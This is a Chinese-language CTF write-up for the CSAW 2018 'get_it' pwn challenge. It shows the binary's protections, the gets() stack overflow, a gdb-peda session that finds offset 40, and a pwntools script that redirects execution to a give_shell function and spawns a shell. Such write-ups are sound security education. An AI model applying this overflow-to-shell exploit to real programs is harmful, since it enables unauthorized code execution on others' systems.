# 考察点


# 分析

```shell
➜  Csaw18_pwn_get_it_simple file get_it 
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
➜  Csaw18_pwn_get_it_simple checksec ./get_it 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/Stack/Csaw18_pwn_get_it_simple/get_it'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled      # not ret2shellcode
    PIE:        No PIE (0x400000)
    Stripped:   No
➜  Csaw18_pwn_get_it_simple ./get_it 
Do you gets it??
yes
```


IDA，存在以下函数**give_shell**
```c
int give_shell()
{
  return system("/bin/bash");
}
```
**main**
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+10h] [rbp-20h] BYREF

  puts("Do you gets it??");
  gets(v4);         // overflow vuln
  return 0;
}
```

简单栈溢出，直接上 gdb pattern
```shell
gdb-peda$ pattern create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
gdb-peda$ r
Starting program: /home/pitta/workspace/pwn_learn/rec0rd/Stack/Csaw18_pwn_get_it_simple/get_it 
Do you gets it??
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7dd18e0 --> 0xfbad2288 
RDX: 0x7ffff7dd3790 --> 0x0 
RSI: 0x60254c --> 0xa ('\n')
RDI: 0x7fffffffdffc --> 0xffffe31c00007f00 
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdef8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
RIP: 0x4005f7 (<main+48>:       ret)
R8 : 0x60254d --> 0x0 
R9 : 0x25416625414a2541 ('A%JA%fA%')
R10: 0x416725414b254135 ('5A%KA%gA')
R11: 0x246 
R12: 0x4004c0 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffdfd0 ("A%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005ec <main+37>:  call   0x4004a0 <gets@plt>
   0x4005f1 <main+42>:  mov    eax,0x0
   0x4005f6 <main+47>:  leave  
=> 0x4005f7 <main+48>:  ret    
   0x4005f8:    nop    DWORD PTR [rax+rax*1+0x0]
   0x400600 <__libc_csu_init>:  push   r15
   0x400602 <__libc_csu_init+2>:        push   r14
   0x400604 <__libc_csu_init+4>:        mov    r15d,edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdef8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
0008| 0x7fffffffdf00 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA"...)
0016| 0x7fffffffdf08 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"...)
0024| 0x7fffffffdf10 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%"...)
0032| 0x7fffffffdf18 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A"...)
0040| 0x7fffffffdf20 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4"...)
0048| 0x7fffffffdf28 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%"...)
0056| 0x7fffffffdf30 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004005f7 in main ()
gdb-peda$ x/gx $rsp
0x7fffffffdef8: 0x4141464141304141
gdb-peda$ pattern offset 0x4141464141304141
4702116732032008513 found at offset: 40         # offset
```
拿到 ret address 的 offset，构造 payload，覆盖返回地址为 `give_shell` 函数

# exp

```python
from pwn import *

pipe = process("./get_it")

give_shell = 0x4005B6
payload = "A" * 40
payload += p64(give_shell)

print(pipe.recvline())
pipe.sendline(payload)
pipe.interactive()

```

```shell
➜  Csaw18_pwn_get_it_simple python ./exp.py 
[+] Starting local process './get_it': pid 11594
Do you gets it??

[*] Switching to interactive mode
$ ls
exp.py  get_it  peda-session-get_it.txt  README.md
$  
```
